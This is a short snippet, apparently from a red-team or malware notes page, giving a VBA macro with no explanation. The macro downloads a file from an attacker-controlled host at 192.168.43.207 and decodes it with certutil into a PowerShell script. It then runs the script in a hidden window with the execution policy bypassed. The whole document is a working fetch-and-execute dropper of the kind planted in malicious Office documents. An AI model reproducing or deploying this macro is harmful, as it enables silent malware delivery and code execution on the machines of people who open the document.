## Macro Code VBA

```
Sub DownloadFileFromURL()

Dim FileUrl As String
Dim objXmlHttpReq As Object
Dim objStream As Object

FileUrl = "http://192.168.43.207:8000/ps1.crt"

Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")

objXmlHttpReq.Open "GET", FileUrl, False, "username", "password"
objXmlHttpReq.send

If objXmlHttpReq.Status = 200 Then
Set objStream = CreateObject("ADODB.Stream")

objStream.Open
objStream.Type = 1
objStream.Write objXmlHttpReq.responseBody
objStream.SaveToFile CurDir() & "\file.crt", 2
objStream.Close

End If

Shell ("cmd /c certutil -decode file.crt decoded.ps1 & c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -exec bypass -W Hidden .\decoded.ps1")

End Sub
```

